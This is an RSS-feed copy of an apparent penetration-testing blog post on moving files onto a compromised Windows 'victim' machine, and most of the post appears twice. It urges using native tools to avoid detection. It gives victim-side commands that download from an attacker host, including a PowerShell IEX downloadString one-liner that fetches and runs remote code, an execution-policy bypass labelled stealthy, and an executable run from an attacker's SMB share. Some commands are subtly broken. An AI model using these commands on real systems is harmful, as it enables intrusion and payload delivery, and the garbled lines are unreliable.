&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-PSDrive -Name &amp;#34;gori&amp;#34; -PSProvider &amp;#34;FileSystem&amp;#34; -gori &amp;#34;\\&amp;lt;YOUR IP&amp;gt;\gori&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;method-2&#34;&gt;Method 2&lt;/h2&gt;
&lt;p&gt;Run this on your Kali machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py kali .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On victim&amp;#39;s \\&amp;lt;YOUR IP ADDRESS&amp;gt;\kali\FILE\_NAME.exe &amp;#34;whoami&amp;#34; # &amp;#34;whoami&amp;#34; confirms that it is running
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-an-httpserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png&#34; alt=&#34;&#34;  /&gt;

File Transfer With an HTTP Server&lt;/h1&gt;
&lt;p&gt;On your machine run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server 80
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;YOUR IP&amp;gt;/path/to/file.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-scp-andrsync&#34;&gt;File Transfer with SCP and RSYNC&lt;/h1&gt;
&lt;p&gt;Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp username@ip_address:/home/username/filename
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp filename username@ip_address:/home/username
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The same commands can be used with RYSNC by simply replacing &lt;code&gt;scp&lt;/code&gt; with &lt;code&gt;rsync&lt;/code&gt; .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rsync &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png" alt=""  />
</p>
<h1 id="foreword">Foreword</h1>
<p>To avoid detection, it is best to use tools that are native to the victim’s computer.</p>
<h1 id="ftp-with-windowshost">FTP with Windows Host</h1>
<p>While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install vsftpd  
</span></span><span style="display:flex;"><span>sudo service vsftpd start  
</span></span><span style="display:flex;"><span>service vsftpd status #status should be active
</span></span></code></pre></div><p>To check if your server is working, type <code>ftp localhost.</code> If you see the message “Connected to localhost”, your FTP server is running.</p>
<h2 id="accessing-file-with-interactive-shell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png" alt=""  />

Accessing File With Interactive Shell</h2>
<p>If you have an interactive shell on the Windows machine, run this command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cscript wget.vbs http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt; &lt;FILENAME TO SAVE AS&gt;
</span></span></code></pre></div><h2 id="accessing-file-with-non-interactive-shell">Accessing File With Non-Interactive Shell</h2>
<p>If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>storageDir <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>pwd <span style="color:#f92672">&gt;</span> wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> System<span style="color:#f92672">.</span>Net<span style="color:#f92672">.</span>WebClient <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt;&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output-file.exe&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient<span style="color:#f92672">.</span>DownloadFile(<span style="color:#f92672">$</span>url,<span style="color:#f92672">$</span>file) <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1
</span></span></code></pre></div><p>To invoke<code>wget.ps1</code>, call</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;)&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>IEX(New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> Net<span style="color:#f92672">.</span>WebClient)<span style="color:#f92672">.</span>downloadString(<span style="color:#e6db74">&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;</span>)
</span></span></code></pre></div><h1 id="getting-files-through-powershell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg" alt=""  />

Getting Files Through PowerShell</h1>
<p>On your Kali Linux machine, make a copy of the file you want to send to <code>/var/www/html/</code> . On the Window’s machine, execute the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.128/unko.txt&#39;,&#39;C:\Users\Administrator\Desktop</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">ransferme.txt&#39;)&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.146/gori.ps1&#39;)&#34;</span>
</span></span></code></pre></div><h1 id="file-transfer-withsmb">File Transfer With SMB</h1>
<h2 id="method-1">Method 1</h2>
<p>Get <code>smbserver.py</code>from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> and run the following on your Kali Linux machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>New-PSDrive -Name &#34;gori&#34; -PSProvider &#34;FileSystem&#34; -gori &#34;\\&lt;YOUR IP&gt;\gori&#34;
</span></span></code></pre></div><h2 id="method-2">Method 2</h2>
<p>Run this on your Kali machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py kali .
</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>On victim&#39;s \\&lt;YOUR IP ADDRESS&gt;\kali\FILE\_NAME.exe &#34;whoami&#34; # &#34;whoami&#34; confirms that it is running
</span></span></code></pre></div><h1 id="file-transfer-with-an-httpserver"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png" alt=""  />

File Transfer With an HTTP Server</h1>
<p>On your machine run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 80
</span></span></code></pre></div><p>This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget http://&lt;YOUR IP&gt;/path/to/file.txt
</span></span></code></pre></div><h1 id="file-transfer-with-scp-andrsync">File Transfer with SCP and RSYNC</h1>
<p>Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp &lt;SOURCE&gt; &lt;DESTINATION&gt;
</span></span></code></pre></div><p>In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp username@ip_address:/home/username/filename
</span></span></code></pre></div><p>If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp filename username@ip_address:/home/username
</span></span></code></pre></div><p>The same commands can be used with RYSNC by simply replacing <code>scp</code> with <code>rsync</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rsync &lt;SOURCE&gt; &lt;DESTINATION&gt;
</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
<p>There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.</p>
]]></content:encoded>
    </item>
  </channel>
</rss>
